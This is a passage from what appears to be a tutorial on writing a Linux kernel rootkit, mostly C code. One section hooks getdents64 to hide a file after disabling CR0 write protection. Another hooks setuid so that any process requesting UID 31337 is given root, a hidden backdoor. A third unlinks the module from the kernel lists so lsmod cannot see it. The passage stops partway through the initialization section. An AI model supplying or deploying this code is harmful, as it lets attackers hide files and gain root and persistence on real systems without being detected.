### 3. Hiding a File (Hooking `getdents`)

To hide a file, we need to intercept the system call that lists directory contents: `getdents` or `getdents64`.

**The Challenge:** The system call table is no longer exported in modern kernels, and it is often read-only. We must find its address in memory and temporarily disable write protection (CR0 register).

Here is a conceptual implementation for an older kernel (4.x) or a kernel with `kallsyms_lookup_name` available:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

// Pointer to the original sys_getdents64
asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);

// The name of the file we want to hide
#define HIDDEN_FILE_NAME "secret.txt"

// Helper to disable write protection
static void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0); // Clear the WP bit
    write_cr0(cr0);
}

// Helper to enable write protection
static void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0); // Set the WP bit
    write_cr0(cr0);
}

// Our hooked function
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    long ret;
    struct linux_dirent64 *current_dir, *previous_dir, *kernel_dirent;
    unsigned long offset = 0;

    // Call the original function first to get the data
    ret = original_getdents64(fd, dirent, count);

    if (ret <= 0) return ret;

    // Allocate kernel memory to hold the directory entries
    kernel_dirent = kmalloc(ret, GFP_KERNEL);
    if (!kernel_dirent) return ret;

    // Copy data from user space to kernel space
    if (copy_from_user(kernel_dirent, dirent, ret)) {
        kfree(kernel_dirent);
        return ret;
    }

    offset = 0;
    previous_dir = NULL;

    while (offset < ret) {
        current_dir = (void *)kernel_dirent + offset;

        // Check if the current file matches our hidden file name
        if (strncmp(current_dir->d_name, HIDDEN_FILE_NAME, strlen(HIDDEN_FILE_NAME)) == 0) {
            // Found it! Now we remove it from the list.
            // If it's the first entry, we shift everything down.
            if (previous_dir) {
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                // If it's the first one, we just move the start pointer forward
                // This is tricky; usually easier to just adjust reclen of the next one
                // or shift the whole buffer. For simplicity, we assume it's not the first one
                // or we implement a shift logic here.
                // A robust implementation involves shifting the memory.
                int reclen = current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + reclen, ret - offset - reclen);
                ret -= reclen;
                continue; // Don't advance offset, we shifted data into current pos
            }
        }

        offset += current_dir->d_reclen;
        previous_dir = current_dir;
    }

    // Copy the modified data back to user space
    if (copy_to_user(dirent, kernel_dirent, ret)) {
        kfree(kernel_dirent);
        return ret;
    }

    kfree(kernel_dirent);
    return ret;
}
```

### 4. Privilege Escalation (Hooking `sys_setuid`)

A common backdoor involves giving a process root privileges if it sends a specific signal or calls a function with a specific argument. Let's hook `sys_setuid`. If a process tries to set its UID to a specific "magic" number (e.g., 31337), we give it root (UID 0) instead.

```c
#define MAGIC_UID 31337

asmlinkage long (*original_setuid)(uid_t uid);

asmlinkage long hooked_setuid(uid_t uid) {
    struct cred *new_cred;

    if (uid == MAGIC_UID) {
        // Attempt to escalate privileges
        new_cred = prepare_creds();
        if (new_cred) {
            // Set UID, GID, etc., to 0 (root)
            new_cred->uid.val = 0;
            new_cred->gid.val = 0;
            new_cred->euid.val = 0;
            new_cred->egid.val = 0;
            new_cred->suid.val = 0;
            new_cred->sgid.val = 0;
            new_cred->fsuid.val = 0;
            new_cred->fsgid.val = 0;

            commit_creds(new_cred);
            return 0; // Success
        }
    }

    return original_setuid(uid);
}
```

### 5. Hiding the Module (`lsmod`)

Even if we hide files, the rootkit itself is visible in `/proc/modules` and the output of `lsmod`. We can remove the module from the kernel's internal linked list.

```c
#include <linux/list.h>

static void hide_module(void) {
    // THIS_MODULE is a macro pointing to the current module's struct module
    // The list is stored in the 'list' member
    list_del(&THIS_MODULE->list);

    // Also hide from /sys/module/
    kobject_del(&THIS_MODULE->mkobj.kobj);
}
```

Call `hide_module()` inside your `rootkit_init` function. Once removed from the list, `rmmod` will not work (because the kernel can't find the module to remove it). You usually need a separate "killer" module or a reboot to unload it.

### 6. Putting it Together (Initialization)

This is the hardest part because of how kernel addresses are handled. In older kernels, you could just access `sys_call_table`. In modern kernels, you must use `kallsyms_lookup_name` (which is also often unexported) to find the address of `sys_getdents64`.

